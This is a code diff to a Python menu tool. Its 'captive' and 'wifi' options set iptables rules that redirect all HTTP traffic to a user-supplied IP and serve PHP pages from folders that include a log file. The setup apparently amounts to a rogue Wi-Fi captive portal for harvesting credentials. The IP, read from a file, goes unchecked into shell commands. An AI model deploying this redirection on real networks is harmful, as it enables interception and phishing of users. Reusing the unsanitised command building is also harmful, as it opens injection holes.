@@ -33,31 +33,56 @@ def run_option():
 # Function to handle the "Run" option
 def captive_option():
     if not os.path.exists("Captive/"):
-     print(colored("Looks like captive.zip not extracted yet\n let me do it for you", 'red'))
-     time.sleep(3)
-     os.system("unzip Captive.zip")
-     main_menu()
+        print(colored("Looks like captive.zip not extracted yet\n let me do it for you", 'red'))
+        time.sleep(3)
+        os.system("unzip Captive.zip")
+        main_menu()
     else:
-        run_commands([
-            "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080",
-            "iptables -A FORWARD -p udp --dport 53 -j ACCEPT",
-            "iptables -A FORWARD -p udp --sport 53 -j ACCEPT",
-            "iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.43.1",
-            "iptables -P FORWARD DROP"
-        ])
+        if os.path.exists("ip.txt"):
+            with open("ip.txt", "r") as file:
+                ip_content = file.read().strip()
+            if ip_content:
+                run_commands([
+                    "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080",
+                    "iptables -A FORWARD -p udp --dport 53 -j ACCEPT",
+                    "iptables -A FORWARD -p udp --sport 53 -j ACCEPT",
+                    f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination {ip_content}",
+                    "iptables -P FORWARD DROP",
+                    "php -S 0.0.0.0 -t Captive/"
+                ])
+            else:
+                print("IP isn't mentioned yet. You have to mention one.")
+                new_ip = input("Enter the IP: ")
+                with open("ip.txt", "w") as file:
+                    file.write(new_ip)
+        else:
+            print("ip.txt file is missing")
+
 # Function to handle the "Run" option
 def wifi_option():
     if not os.path.exists("Server/server.php") or not os.path.exists("Server/index.html") or not os.path.exists("Server/log.txt"):
         print(colored("You didn't even compile yet", 'red'))
     else:
-        run_commands([
-            "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080",
-            "iptables -A FORWARD -p udp --dport 53 -j ACCEPT",
-            "iptables -A FORWARD -p udp --sport 53 -j ACCEPT",
-            "iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.43.1",
-            "iptables -P FORWARD DROP"
-        ])
-
+        if os.path.exists("ip.txt"):
+            with open("ip.txt", "r") as file:
+                ip_content = file.read().strip()
+            if ip_content:
+                run_commands([
+                    "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080",
+                    "iptables -A FORWARD -p udp --dport 53 -j ACCEPT",
+                    "iptables -A FORWARD -p udp --sport 53 -j ACCEPT",
+                    f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination {ip_content}",
+                    "iptables -P FORWARD DROP",
+                    "php -S 0.0.0.0:8080 -t Server/"
+                ])
+            else:
+                print("IP isn't mentioned yet. You have to mention one.")
+                new_ip = input("Enter the IP: ")
+                with open("ip.txt", "w") as file:
+                    file.write(new_ip)
+        else:
+            print("ip.txt file is missing")
+            
 # Function to handle the "Compile" option
 def compile_option():
     if os.path.exists("Server/compile.php") or os.path.exists("Server/compile.html") or os.path.exists("Server/compile.txt"):
